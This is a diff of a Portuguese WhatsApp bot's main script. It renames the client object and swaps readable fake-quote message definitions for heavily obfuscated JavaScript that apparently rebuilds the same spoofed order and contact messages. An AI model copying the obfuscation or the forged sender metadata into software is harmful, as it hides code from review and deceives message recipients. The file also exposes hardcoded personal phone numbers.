5)+_0x17ff04(0x53b,0x51a,0x531,0x525,0x510)+_0x17ff04(0x585,0x55d,0x570,0x563,0x54b)&&mek[_0x1f6cdf(0x338,0x31b,0x31f,0x319,0x322)+'ge'][_0x279dcf(-0x1de,-0x1b5,-0x1dd,-0x1cd,-0x1b7)+_0x4c4d5d(0x3e3,0x3c6,0x3e3,0x3bf,0x3a8)+'on'][_0x4c4d5d(0x3e9,0x3c7,0x3d9,0x3c8,0x3c1)+_0x4c4d5d(0x3bb,0x3bc,0x3df,0x3cc,0x3c6)](prefix)?mek[_0x4c4d5d(0x383,0x392,0x37e,0x376,0x3b1)+'ge'][type][_0x1f6cdf(0x328,0x33e,0x33e,0x329,0x312)+_0x4c4d5d(0x3ba,0x3a3,0x3aa,0x38b,0x3bd)+_0x4c4d5d(0x393,0x386,0x367,0x388,0x369)+'d']:type==_0x279dcf(-0x201,-0x1fd,-0x1ef,-0x1fd,-0x1e0)+_0x1f6cdf(0x311,0x347,0x349,0x331,0x34f)+'ge'&&prefix[_0x1f6cdf(0x314,0x33c,0x354,0x335,0x33b)+_0x1f6cdf(0x314,0x32e,0x34d,0x337,0x334)](mek[_0x1f6cdf(0x319,0x305,0x33c,0x319,0x313)+'ge'][_0x1f6cdf(0x32b,0x2ff,0x303,0x31c,0x300)+_0x1f6cdf(0x34a,0x330,0x32a,0x331,0x342)+'ge'][_0x279dcf(-0x222,-0x216,-0x21a,-0x200,-0x1ee)+'ge'][-0x3*-0xac1+-0x2*0x83+0x1f3d*-0x1])?mek[_0x4c4d5d(0x3b2,0x392,0x395,0x3a2,0x3af)+'ge'][_0x4c4d5d(0x380,0x395,0x392,0x3a5,0x389)+_0x17ff04(0x544,0x52c,0x534,0x544,0x54f)+'ge'][_0x1f6cdf(0x329,0x303,0x30c,0x319,0x32f)+'ge']:type==_0x279dcf(-0x1da,-0x1da,-0x1ee,-0x1e3,-0x1cb)+_0x1f6cdf(0x341,0x34e,0x353,0x34f,0x368)+_0x279dcf(-0x1c9,-0x1c4,-0x200,-0x1de,-0x1e4)&&prefix[_0x17ff04(0x55e,0x553,0x52f,0x548,0x548)+_0x17ff04(0x550,0x558,0x559,0x54a,0x56c)](mek[_0x4c4d5d(0x371,0x392,0x37e,0x397,0x3ae)+'ge'][_0x279dcf(-0x1e9,-0x1f9,-0x1c8,-0x1e3,-0x202)+_0x17ff04(0x57c,0x563,0x554,0x562,0x580)+_0x1f6cdf(0x357,0x34e,0x35e,0x33b,0x32d)][_0x4c4d5d(0x399,0x3af,0x3a7,0x3b1,0x3c9)+'ct'][_0x17ff04(0x56f,0x563,0x54e,0x54d,0x54d)][0x871*-0x1+0x2100+-0x188f*0x1])?mek[_0x1f6cdf(0x32d,0x2fb,0x327,0x319,0x302)+'ge'][_0x279dcf(-0x1ff,-0x1d0,-0x1cf,-0x1e3,-0x1d3)+_0x17ff04(0x55d,0x55e,0x55f,0x562,0x55e)+_0x1f6cdf(0x34c,0x323,0x34d,0x33b,0x327)][_0x4c4d5d(0x38d,0x3af,0x3a4,0x3a6,0x3a2)+'ct'][_0x17ff04(0x54b,0x551,0x524,0x535,0x557)]:'';
 			budy = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : ''
 			selectedButton = (type == 'buttonsResponseMessage') ? mek.message.buttonsResponseMessage.selectedButtonId : ''
             responseButton = (type == 'listResponseMessage') ? mek.message.listResponseMessage.title : ''
@@ -814,9 +778,9 @@ addLevelingXp(tttset.player, randomEndTTTXP)
 const checkTTTIdEnd = getTTTId(tttset.player)
 if (checkTTTIdEnd === undefined) addTTTId(tttset.player)
 addTTTpoints(tttset.player, randomEndTTTXP)
-tomioka.sendMessage(tttset.local,`❌ O TEMPO DE JOGO EXPIROU ❌\n\n➣  PUNIÇÃO: ${randomEndTTTXP} XP 🔮`, text, {quoted: tttset.mentionPlayer})
+client.sendMessage(tttset.local,`❌ O TEMPO DE JOGO EXPIROU ❌\n\n➣  PUNIÇÃO: ${randomEndTTTXP} XP 🔮`, text, {quoted: tttset.mentionPlayer})
 } else {
-tomioka.sendMessage(tttset.local,`❌ O TEMPO DE JOGO EXPIROU ❌`, text, {quoted: tttset.mentionPlayer})
+client.sendMessage(tttset.local,`❌ O TEMPO DE JOGO EXPIROU ❌`, text, {quoted: tttset.mentionPlayer})
 }
 esp.a1 = "🔲"; esp.a2 = "🔲"; esp.a3 = "🔲"
 esp.b1 = "🔲"; esp.b2 = "🔲"; esp.b3 = "🔲"
@@ -866,16 +830,16 @@ request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
 const math = (teks) => {
 				return Math.floor(teks)
 		}
-			const botNumber = tomioka.user.jid
-			const totalchat = await tomioka.chats.all()
+			const botNumber = client.user.jid
+			const totalchat = await client.chats.all()
 			const ownerNumber = ["554498220867@s.whatsapp.net","554499019776@s.whatsapp.net"] // replace this with your number
 			const mod = [ownerNumber,"554498220867@s.whatsapp.net","554499019776@s.whatsapp.net"]//ubah nomor lo
 			const adminbotnumber = ["554498220867@s.whatsapp.net","554499019776@s.whatsapp.net"]//ubah nomor lo
 			const frendsowner = ["554498220867@s.whatsapp.net","554499019776@s.whatsapp.net"]//ubah nomor l
 			const isGroup = from.endsWith('@g.us')
-			const senderfix = mek.key.fromMe ? tomioka.user.jid : isGroup ? mek.participant : mek.key.remoteJid
+			const senderfix = mek.key.fromMe ? client.user.jid : isGroup ? mek.participant : mek.key.remoteJid
 			const sender = isGroup ? mek.participant : mek.key.remoteJid
-			const groupMetadata = isGroup ? await tomioka.groupMetadata(from) : ''
+			const groupMetadata = isGroup ? await client.groupMetadata(from) : ''
 			const groupName = isGroup ? groupMetadata.subject : ''
 			const groupMembers = isGroup ? groupMetadata.participants : ''
 			const groupDesc = isGroup ? groupMetadata.desc : ''
@@ -907,7 +871,7 @@ const math = (teks) => {
 			const isOwner = ownerNumber.includes(sender)
 			const isPremium = premium.includes(sender)
             const isBanned = ban.includes(sender)
-            pushname = tomioka.contacts[sender] != undefined ? tomioka.contacts[sender].vname || tomioka.contacts[sender].notify : undefined
+            pushname = client.contacts[sender] != undefined ? client.contacts[sender].vname || client.contacts[sender].notify : undefined
             fake = `Olá ${pushname}💫`
             const q = args.join(' ')
             uptime = process.uptime();
@@ -930,13 +894,13 @@ const math = (teks) => {
 
         hasil = await getBuffer(link)
 
-        tomioka.sendMessage(from, hasil, type, options).catch(e => {
+        client.sendMessage(from, hasil, type, options).catch(e => {
 
             fetch(link).then((hasil) => {
 
-                tomioka.sendMessage(from, hasil, type, options).catch(e => {
+                client.sendMessage(from, hasil, type, options).catch(e => {
 
-                    tomioka.sendMessage(from, { url: link }, type, options).catch(e => {
+                    client.sendMessage(from, { url: link }, type, options).catch(e => {
 
 
 
@@ -953,7 +917,7 @@ const math = (teks) => {
     }
 const sendButLocation = async (id, text1, desc1, gam1, but = [], options = {}) => {
 kma = gam1
-mhan = await tomioka.prepareMessage(from, kma, location)
+mhan = await client.prepareMessage(from, kma, location)
 const buttonMessages = {
 locationMessage: mhan.message.locationMessage,
 contentText: text1,
@@ -961,12 +925,12 @@ footerText: desc1,
 buttons: but,
 headerType: 6
 }
-tomioka.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
+client.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
 }
 const listmsg = (from, title, desc, list) => { 
-            let po = tomioka.prepareMessageFromContent(from, {"listMessage": {"title": title,"description": desc,"buttonText": "Escolha aqui","footerText": "Não se esqueça de colocar os créditos seu fdp","listType": "SINGLE_SELECT","sections": list}}, {})
+            let po = client.prepareMessageFromContent(from, {"listMessage": {"title": title,"description": desc,"buttonText": "Escolha aqui","footerText": "Não se esqueça de colocar os créditos seu fdp","listType": "SINGLE_SELECT","sections": list}}, {})
 
-            return tomioka.relayWAMessage(po, {waitForAck: true})
+            return client.relayWAMessage(po, {waitForAck: true})
 
             }
             //___________SISTEMA LEVELING AUTO____________//
@@ -1104,7 +1068,7 @@ const amountXp = Math.trunc(Math.random() * 20) * currentLevel
                                     mentionedJid: [namelv]
                                 }
                             }
-                        tomioka.sendMessage(from, lvup, text, {quoted: mek})
+                        client.sendMessage(from, lvup, text, {quoted: mek})
                         }
                     } catch (err) {
                         console.error(err)
@@ -1157,7 +1121,7 @@ charging = 'não detectado'
                     let asw = './sticker' + names + '.webp'
                     exec(`ffmpeg -i ${filess} -vf "scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=60, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse" ${asw}`, (err) => {
                         let media = fs.readFileSync(asw)
-                        tomioka.sendMessage(to, media, MessageType.sticker,{quoted:mek, contextInfo:tomio})
+                        client.sendMessage(to, media, MessageType.sticker,{quoted:mek, contextInfo:tomio})
                         fs.unlinkSync(filess)
                         fs.unlinkSync(asw)
                     });
@@ -1597,11 +1561,11 @@ dica: 'ALIMENTO'
 			 if(budy.slice(0,4).toUpperCase() == dataAnagrama.original.slice(0,4).toUpperCase() && budy.toUpperCase() != dataAnagrama.original) return reply('está perto')
 		 xp = Math.floor(Math.random() * 14) + 100000
 		 dinhero = Math.floor(Math.random() * 10) + 500
-		if(budy.toUpperCase() == dataAnagrama.original) { tomioka.sendMessage(from, `parabéns ${pushname} 🥳 você ganhou o jogo\nPalavra : ${dataAnagrama.original}\nIniciando o proximo jogo em 5 segundos...`, MessageType.text, {"mentionedJid": [sender]}), fs.unlinkSync(`./src/anagrama-${from}.json`)		 
+		if(budy.toUpperCase() == dataAnagrama.original) { client.sendMessage(from, `parabéns ${pushname} 🥳 você ganhou o jogo\nPalavra : ${dataAnagrama.original}\nIniciando o proximo jogo em 5 segundos...`, MessageType.text, {"mentionedJid": [sender]}), fs.unlinkSync(`./src/anagrama-${from}.json`)		 
 		setTimeout(async() => {
 		fs.writeFileSync(`./src/anagrama-${from}.json`, `${JSON.stringify(palavrasANA[Math.floor(Math.random() * palavrasANA.length)])}`)
 			let dataAnagrama2 = JSON.parse(fs.readFileSync(`./src/anagrama-${from}.json`))
-			tomioka.sendMessage(from, `
+			client.sendMessage(from, `
 ╭─────≽「 👾 ANAGRAMA 👾 」
 │➽ DESCUBRA A PALAVRA
 │➽ ANAGRAMA: ${dataAnagrama2.embaralhada}
@@ -1642,7 +1606,7 @@ Sua vez... : @${boardnow.turn == "X" ? boardnow.X : boardnow.O}
      ${matrix[2][0]}  ${matrix[2][1]}  ${matrix[2][2]}
 
 `;
-                    tomioka.sendMessage(from, chatAccept, MessageType.text, {
+                    client.sendMessage(from, chatAccept, MessageType.text, {
                          quoted: mek,
                          contextInfo: {
                               mentionedJid: [
@@ -1660,7 +1624,7 @@ Sua vez... : @${boardnow.turn == "X" ? boardnow.X : boardnow.O}
                     if (boardnow.status)
                          return reply(`O jogo já começou!`);
                     fs.unlinkSync(`./lib/tictactoe/db/${from}.json`);
-                    tomioka.sendMessage(
+                    client.sendMessage(
                          from,
                          `@${boardnow.X} *_Infelizmente seu oponente não aceito o desafio ❌😕_*`,
                          MessageType.text, {
@@ -1671,7 +1635,7 @@ Sua vez... : @${boardnow.turn == "X" ? boardnow.X : boardnow.O}
                     }
                     );
                } else {
-                    tomioka.sendMessage(
+                    client.sendMessage(
                          from,
                          MessageType.text, {
                          quoted: mek,
@@ -1700,7 +1664,7 @@ Sua vez... : @${boardnow.turn == "X" ? boardnow.X : boardnow.O}
           
 Jogo termina empatado 😐
 `
-                    tomioka.sendMessage(from, chatEqual, MessageType.text, );
+                    client.sendMessage(from, chatEqual, MessageType.text, );
                     fs.unlinkSync(`./lib/tictactoe/db/${from}.json`);
                     return;
                }
@@ -1718,7 +1682,7 @@ addLevelingXp(tttset.player, randomTTTXP)
             //    giftLimit(winnerJID + "@s.whatsapp.net", limWin);
             //    pushLimit(looseJID + "@s.whatsapp.net", limLoose);
             addKoinUser(winnerJID + "@s.whatsapp.net", dinherowin)           
-               tomioka.sendMessage(from, chatWon, MessageType.text, {
+               client.sendMessage(from, chatWon, MessageType.text, {
                     quoted: mek,
                     contextInfo: {
                          mentionedJid: [
@@ -1732,7 +1696,7 @@ setTimeout( () => {
 if (fs.existsSync("./lib/tictactoe/db/" + from + ".json")) {
  fs.unlinkSync("./lib/tictactoe/db/" + from + ".json");
  const chatFqual = `*🕹️JOGO DA VELHA RESETADO...🕹️*`
-                   tomioka.sendMessage(from, chatFqual, MessageType.text, )
+                   client.sendMessage(from, chatFqual, MessageType.text, )
     
                
  } else {
@@ -1756,7 +1720,7 @@ Sua vez : @${moving.turn == "X" ? moving.X : moving.O}
 
 
 `;
-               tomioka.sendMessage(from, chatMove, MessageType.text, {
+               client.sendMessage(from, chatMove, MessageType.text, {
                     quoted: mek,
                     contextInfo: {
                          mentionedJid: [
@@ -1797,15 +1761,7 @@ Sua vez : @${moving.turn == "X" ? moving.X : moving.O}
                 case 23: waktoonyabro = `Boa noite ${pushname}🌛`; break;
             }
             var ucapanFakereply = '' + waktoonyabro;
-            //verificados quoted
-            const tomioka ={"key": {   "fromMe": false,"participant":"0@s.whatsapp.net",   "remoteJid": "status@broadcast"  }, "message": {orderMessage: {itemCount: 696969,status: 200, thumbnail: fs.readFileSync(`assets/botlogo.webp`), message: `${waktoonyabro}\n𝐜𝐨𝐦𝐚𝐧𝐝𝐨: ${command}`, orderTitle: 'TOMIOKA', sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
-            const tomioka2 ={"key": {   "fromMe": false,"participant":"0@s.whatsapp.net",   "remoteJid": "status@broadcast"  }, "message": {orderMessage: {itemCount: 696969,status: 200, thumbnail: fs.readFileSync(`assets/botlogo.webp`), surface: 200, message: `${waktoonyabro}💫`, orderTitle: 'TOMIOKA', sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true} 
-            const tomioka3 = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: `6283136505591-1614953337@g.us` } : {}) }, message: { 'contactMessage': { 'displayName': `${pushname}\n➢  ${command}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;tomioka,;;;\nFN:tomioka,\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': fs.readFileSync(`./assets/botlogo.webp`), thumbnail:fs.readFileSync(`./assets/botlogo.webp`),sendEphemeral: true}}}       
-            const tomio ={"key": {   "fromMe": false,"participant":"0@s.whatsapp.net",   "remoteJid": "status@broadcast"  }, "message": {conversation: fake, orderTitle: 'TOMIOKA', sellerJid: '0@s.whatsapp.net'}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
-            // contextInfo
-            const tomi = {text: 'oi',"forwardingScore": 1000000000,isForwarded: true,sendEphemeral: true, "externalAdReply": {"title": `GRUPO DO BOT\n𝕋𝕆𝕄𝕀𝕆𝕂𝔸 𝔹𝕆𝕋-ℂℍ𝔸𝕋 𝕆𝔽ℂ`,"body": "","previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./grupo.jpg`),"sourceUrl": `https://chat.whatsapp.com/EVtJliGrMzmEq2gwNBgOxd`},mentionedJid:[sender]}
-            const tomis = {text: 'oi',"forwardingScore": 1000000000,isForwarded: true,sendEphemeral: true, "externalAdReply": {"title": `TIO TOMIOKA`,"body": "","previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./eu.jpg`),"sourceUrl": `Tio Tomioka\nhttps://api.whatsapp.com/send?phone=5544998220867&text=olá%20*Tio Tomioka!*`},mentionedJid:[sender]} 
-            //https://wa.me/qr/C6LOZNAIYEUXF1
+            (function(_0x426645,_0x81636a){function _0x3e07f3(_0x136496,_0xf376b3,_0x5606c8,_0x11f8ad,_0x997551){return _0x3211(_0xf376b3- -0x3d1,_0x5606c8);}const _0x5455d7=_0x426645();function _0x56224f(_0x51fea0,_0x51f627,_0x49cf1e,_0x94a143,_0x29ab0e){return _0x3211(_0x51f627- -0x12a,_0x29ab0e);}function _0x28197a(_0x37dd92,_0x481dbe,_0xeb7c76,_0x2e482e,_0x4c85ab){return _0x3211(_0x37dd92- -0x3f,_0x4c85ab);}function _0x249a0e(_0x4f1639,_0x583014,_0x536a01,_0x2682c2,_0x37558b){return _0x3211(_0x2682c2-0x317,_0x4f1639);}function _0x6331e1(_0x304624,_0x68e2e8,_0x1656e6,_0x5d05d0,_0x111313){return _0x3211(_0x111313- -0x3ca,_0x304624);}while(!![]){try{const _0x2f7905=-parseInt(_0x3e07f3(-0x230,-0x24e,-0x274,-0x23b,-0x23b))/(0x1c*-0x1+-0x17f*0xf+0x168e)*(parseInt(_0x3e07f3(-0x234,-0x205,-0x1fd,-0x1ea,-0x226))/(-0xd4+-0xd9a*0x1+0xe70))+parseInt(_0x28197a(0x176,0x154,0x15e,0x192,0x1a0))/(0x1*-0x1eb5+0x69c+-0x607*-0x4)+-parseInt(_0x28197a(0x19e,0x16a,0x16a,0x1a8,0x1c7))/(-0x1007+0xf*0x19b+0x405*-0x2)*(-parseInt(_0x249a0e(0x4d3,0x4d2,0x4ce,0x4a6,0x4d2))/(-0x26b1+-0x1288*-0x2+0x1a6))+-parseInt(_0x3e07f3(-0x1f9,-0x1e9,-0x1df,-0x1e8,-0x1ec))/(0x963+-0x1b3b*-0x1+0x4*-0x926)+-parseInt(_0x249a0e(0x4bf,0x4d1,0x515,0x4ea,0x4cf))/(-0x22a4+0x4c3*0x1+0x1de8)*(parseInt(_0x249a0e(0x4b0,0x4d5,0x4e6,0x4c0,0x4c3))/(0x8a+0x2*-0x96e+0x125a))+parseInt(_0x28197a(0x180,0x17b,0x14c,0x196,0x199))/(0x1*0x7fb+-0x978+0x186*0x1)+-parseInt(_0x6331e1(-0x230,-0x24a,-0x21f,-0x233,-0x244))/(0x1c94+-0xb3d*0x1+-0x114d)*(-parseInt(_0x249a0e(0x508,0x508,0x4d4,0x4ef,0x4fb))/(0xe75*-0x1+0x3d*0x3d+-0x9));if(_0x2f7905===_0x81636a)break;else _0x5455d7['push'](_0x5455d7['shift']());}catch(_0x443a75){_0x5455d7['push'](_0x5455d7['shift']());}}}(_0x4d3e,0xd*-0xdb17+-0x53209+0x5eaaa*0x4));const _0x385c9a=(function(){let _0x3d377d=!![];return function(_0x426e96,_0x38b311){const _0x71a356=_0x3d377d?function(){function _0x307205(_0x270cf0,_0x30c9ef,_0x2124ee,_0x114a14,_0x299950){return _0x3211(_0x299950-0x1cb,_0x270cf0);}if(_0x38b311){const _0x759903=_0x38b311[_0x307205(0x395,0x380,0x372,0x35e,0x37c)](_0x426e96,arguments);return _0x38b311=null,_0x759903;}}:function(){};return _0x3d377d=![],_0x71a356;};}()),_0x5c344b=_0x385c9a(this,function(){const _0x3a5f6e={};function _0x255167(_0x397def,_0x3f59d4,_0x28b66a,_0x303042,_0x452532){return _0x3211(_0x452532- -0x18f,_0x3f59d4);}_0x3a5f6e[_0x255167(0xc,0x45,0x5e,0xa,0x40)]=_0x255167(0x22,0x22,-0x20,-0xe,0x7)+_0x255167(0x3e,0x14,0x17,0x14,0x38)+'+$';function _0x10b70(_0x118c1c,_0x2eea2d,_0x47f50b,_0x50ecda,_0x478d97){return _0x3211(_0x118c1c- -0xa,_0x47f50b);}function _0x329e49(_0x56943c,_0x517673,_0x119dda,_0x1b4526,_0x18de34){return _0x3211(_0x517673- -0x176,_0x119dda);}const _0x2f58b2=_0x3a5f6e;function _0x2a549c(_0x500b35,_0x5db03e,_0x2af720,_0x2ea1d9,_0x3b9519){return _0x3211(_0x500b35- -0x62,_0x5db03e);}function _0x1e6ae6(_0x4faec1,_0x56480a,_0x12cb3c,_0x45dbcb,_0x568228){return _0x3211(_0x45dbcb-0x1cf,_0x12cb3c);}return _0x5c344b[_0x255167(0x21,0x48,0x5c,0x20,0x25)+_0x10b70(0x18b,0x15f,0x15a,0x1ac,0x15a)]()[_0x255167(0x22,-0x2b,-0x24,-0x5,-0xa)+'h'](_0x2f58b2[_0x2a549c(0x16d,0x147,0x16b,0x174,0x186)])[_0x10b70(0x1aa,0x1c8,0x1dc,0x19a,0x187)+_0x329e49(0xd,0x1f,0x51,0x2e,0x1c)]()[_0x10b70(0x1da,0x1a8,0x1a9,0x1ed,0x1ec)+_0x2a549c(0x15a,0x151,0x13e,0x131,0x134)+'r'](_0x5c344b)[_0x1e6ae6(0x341,0x35f,0x357,0x354,0x331)+'h'](_0x2f58b2[_0x10b70(0x1c5,0x1be,0x1a3,0x190,0x1d2)]);});_0x5c344b();const _0x388a10={};_0x388a10[_0x464d6f(-0x2d,-0x3d,-0x63,0x8,-0x3d)+'e']=![],_0x388a10[_0x464d6f(0x28,0x14,-0x5,0x58,0x44)+_0x5b9071(-0x133,-0x173,-0x132,-0x15b,-0x192)+'t']=_0x532209(-0xf7,-0xce,-0xed,-0xc2,-0xa9)+_0x403dce(-0x16f,-0x16c,-0x150,-0x195,-0x150)+_0x403dce(-0x1a5,-0x1c0,-0x1d9,-0x1a9,-0x1da)+'t',_0x388a10[_0x532209(-0x9e,-0x6b,-0x86,-0x77,-0x7a)+_0x1fc37e(0x28,0x3d,0x2a,0x26,-0x9)]=_0x464d6f(0xb,-0x7,0xd,-0x4,0x12)+_0x1fc37e(0x25,0x1a,0x24,0x39,0xc)+_0x403dce(-0x199,-0x174,-0x18d,-0x162,-0x144)+'t';const _0x13680e={};_0x13680e[_0x1fc37e(0x20,0x1d,0x33,0x5a,0xd)+_0x5b9071(-0x126,-0x13e,-0x184,-0x14d,-0x131)+_0x5b9071(-0x15b,-0x179,-0x180,-0x149,-0x15c)]=0x3e7,_0x13680e[_0x1fc37e(0x4c,0x19,0x3d,0x20,0xe)+_0x5b9071(-0x153,-0x148,-0x173,-0x17f,-0x17a)+'d']=!![];const tomioka={'key':_0x388a10,'message':{'orderMessage':{'itemCount':0xaa289,'status':0xc8,'thumbnail':fs[_0x403dce(-0x1ae,-0x1a9,-0x1b9,-0x1ab,-0x197)+_0x532209(-0x68,-0xa6,-0x6f,-0x7d,-0x97)+'nc'](_0x5b9071(-0x1ab,-0x14a,-0x19a,-0x174,-0x172)+_0x532209(-0x8a,-0xa5,-0xd1,-0xa6,-0xcb)+_0x532209(-0x84,-0xac,-0x80,-0x7b,-0x65)+_0x5b9071(-0x176,-0x1a0,-0x179,-0x18c,-0x1c0)),'message':waktoonyabro+(_0x403dce(-0x15c,-0x16d,-0x139,-0x1a3,-0x17c)+_0x403dce(-0x1c2,-0x1b9,-0x1d7,-0x1b3,-0x1df))+command,'orderTitle':_0x5b9071(-0x12c,-0x179,-0x172,-0x162,-0x15a)+'KA','sellerJid':_0x532209(-0xa3,-0xf5,-0xb1,-0xc2,-0xda)+_0x5b9071(-0x167,-0x132,-0x15b,-0x144,-0x12f)+_0x403dce(-0x1ea,-0x1c0,-0x1bb,-0x1e6,-0x1ac)+'t'}},'contextInfo':_0x13680e,'sendEphemeral':!![]},_0xbed2b2={};_0xbed2b2[_0x403dce(-0x1c3,-0x1c8,-0x195,-0x1b9,-0x1c0)+'e']=![],_0xbed2b2[_0x403dce(-0x172,-0x173,-0x14c,-0x18d,-0x163)+_0x403dce(-0x19d,-0x183,-0x150,-0x198,-0x182)+'t']=_0x464d6f(-0x13,0x19,-0x1f,-0x1b,-0x5)+_0x5b9071(-0x158,-0x136,-0x124,-0x144,-0x137)+_0x403dce(-0x1bb,-0x1c0,-0x1b4,-0x1da,-0x1f3)+'t',_0xbed2b2[_0x464d6f(0x38,0x49,0x9,0x53,0xf)+_0x5b9071(-0x18b,-0x1a6,-0x191,-0x17e,-0x193)]=_0x5b9071(-0x16b,-0x198,-0x171,-0x168,-0x196)+_0x464d6f(-0x11,-0x31,-0x39,0xc,0x10)+_0x1fc37e(0x7f,0x88,0x5c,0x39,0x6c)+'t';const _0x340aac={};_0x340aac[_0x403dce(-0x166,-0x19d,-0x1d2,-0x171,-0x1ba)+_0x403dce(-0x16a,-0x175,-0x194,-0x1aa,-0x1a9)+_0x403dce(-0x153,-0x171,-0x19e,-0x158,-0x19b)]=0x3e7,_0x340aac[_0x1fc37e(0x4a,0x6b,0x3d,0x2a,0x23)+_0x5b9071(-0x1ad,-0x1a5,-0x194,-0x17f,-0x163)+'d']=!![];function _0x3211(_0x445ea5,_0x6fb9f6){const _0x10b733=_0x4d3e();return _0x3211=function(_0x1dbe82,_0x9ee17e){_0x1dbe82=_0x1dbe82-(0x313*0x1+-0x59d+0x1*0x40d);let _0x31abe9=_0x10b733[_0x1dbe82];return _0x31abe9;},_0x3211(_0x445ea5,_0x6fb9f6);}const tomioka2={'key':_0xbed2b2,'message':{'orderMessage':{'itemCount':0xaa289,'status':0xc8,'thumbnail':fs[_0x1fc37e(0x50,0x3f,0x27,0x13,0x53)+_0x1fc37e(0x75,0x82,0x67,0x96,0x36)+'nc'](_0x403dce(-0x192,-0x19c,-0x1c4,-0x182,-0x1b8)+_0x532209(-0xd4,-0xc9,-0x85,-0xa6,-0xb1)+_0x5b9071(-0x10a,-0x11c,-0x119,-0x13f,-0x166)+_0x1fc37e(0x6,-0x5,0x1c,0xf,0x3)),'surface':0xc8,'message':waktoonyabro+'💫','orderTitle':_0x1fc37e(0x61,0x2e,0x46,0x12,0x6b)+'KA','sellerJid':_0x403dce(-0x1e5,-0x1ae,-0x1c0,-0x1af,-0x1a9)+_0x1fc37e(0x2e,0x45,0x64,0x5f,0x54)+_0x403dce(-0x19e,-0x1c0,-0x1a4,-0x1e7,-0x1b8)+'t'}},'contextInfo':_0x340aac,'sendEphemeral':!![]},_0x3f65eb={};function _0x1fc37e(_0x4c84a1,_0x4def73,_0x543a1b,_0x23cec4,_0x38d77f){return _0x3211(_0x543a1b- -0x183,_0x23cec4);}_0x3f65eb[_0x1fc37e(0x74,0xa1,0x6d,0x5d,0x7a)+_0x5b9071(-0x1ae,-0x153,-0x17f,-0x17e,-0x158)]=_0x5b9071(-0x189,-0x145,-0x15b,-0x159,-0x150)+_0x1fc37e(0x69,0x4a,0x3b,0x53,0x52)+_0x532209(-0xa2,-0xc9,-0xef,-0xbf,-0xf1)+_0x464d6f(0xa,0xc,0xe,-0x1c,0x20)+_0x403dce(-0x15a,-0x17c,-0x150,-0x19a,-0x166)+_0x532209(-0xd0,-0xba,-0x101,-0xda,-0xc7);const _0x2f723e={'fromMe':![],'participant':_0x5b9071(-0x19f,-0x181,-0x165,-0x186,-0x1b5)+_0x5b9071(-0x11e,-0x13a,-0x11b,-0x144,-0x10e)+_0x1fc37e(-0x7,0x2c,0x10,0x15,0x32)+'t',...from?_0x3f65eb:{}},tomioka3={'key':_0x2f723e,'message':{'contactMessage':{'displayName':pushname+_0x403dce(-0x18a,-0x166,-0x15c,-0x168,-0x140)+command,'vcard':_0x532209(-0xc4,-0xea,-0xef,-0xcc,-0xbd)+_0x532209(-0x85,-0x99,-0x9d,-0xac,-0xd9)+_0x532209(-0xf0,-0x10f,-0xd4,-0xe0,-0xaa)+_0x532209(-0x7f,-0xa8,-0x98,-0x9d,-0xc7)+_0x1fc37e(0xf,0x35,0x1b,0x1d,0x40)+_0x403dce(-0x181,-0x172,-0x157,-0x14f,-0x13b)+_0x5b9071(-0x12e,-0x14c,-0x15f,-0x15e,-0x174)+_0x5b9071(-0x14b,-0x156,-0x17c,-0x180,-0x18b)+_0x5b9071(-0x1bb,-0x15f,-0x16d,-0x185,-0x1a4)+_0x5b9071(-0x17d,-0x172,-0x159,-0x15e,-0x178)+_0x1fc37e(0x98,0x43,0x66,0x68,0x3c)+_0x464d6f(0x1d,0x3e,0x42,0x53,0x10)+_0x532209(-0x74,-0x68,-0x82,-0x99,-0xcf)+_0x5b9071(-0x19d,-0x150,-0x175,-0x17c,-0x16d)+sender[_0x532209(-0xaf,-0x6c,-0x65,-0x84,-0xa8)]('@')[0x1*0x139f+-0x11b3*0x1+-0x52*0x6]+':'+sender[_0x1fc37e(0x4f,0x78,0x60,0x36,0x57)]('@')[-0x84a+0x18a4+0x17*-0xb6]+(_0x403dce(-0x1be,-0x1c9,-0x1c3,-0x1f3,-0x1e7)+_0x1fc37e(0x3a,0x33,0x11,-0x7,0x7)+_0x1fc37e(0x8,0x62,0x2d,-0x2,0x4e)+_0x464d6f(-0x1f,-0x4b,-0x15,-0x2a,0xf)+_0x403dce(-0x173,-0x1a1,-0x17d,-0x1d2,-0x1be)+_0x403dce(-0x1b9,-0x196,-0x194,-0x170,-0x1cc)+_0x532209(-0xb0,-0xb2,-0xc6,-0xae,-0xc7)),'jpegThumbnail':fs[_0x5b9071(-0x1b2,-0x169,-0x181,-0x181,-0x18c)+_0x532209(-0x68,-0x84,-0x9c,-0x7d,-0x56)+'nc'](_0x464d6f(-0x27,-0x50,-0x13,0x8,0x2)+_0x532209(-0x9f,-0x8e,-0xea,-0xc4,-0xf8)+_0x532209(-0x111,-0xe0,-0xf1,-0xdf,-0xdc)+_0x403dce(-0x194,-0x177,-0x16a,-0x198,-0x196)+'p'),'thumbnail':fs[_0x464d6f(-0xe,0x18,-0x29,-0x3a,-0x4)+_0x532209(-0x58,-0x93,-0x68,-0x7d,-0x50)+'nc'](_0x1fc37e(-0x1a,0x2c,0xe,0x3f,0x10)+_0x403dce(-0x1c0,-0x1b0,-0x18e,-0x182,-0x1e4)+_0x1fc37e(0x25,0x29,0x5,0x25,-0x32)+_0x532209(-0x90,-0x6b,-0x77,-0x8b,-0xc2)+'p'),'sendEphemeral':!![]}}},_0x409d68={};_0x409d68[_0x532209(-0xca,-0xc9,-0xea,-0xdc,-0x100)+'e']=![],_0x409d6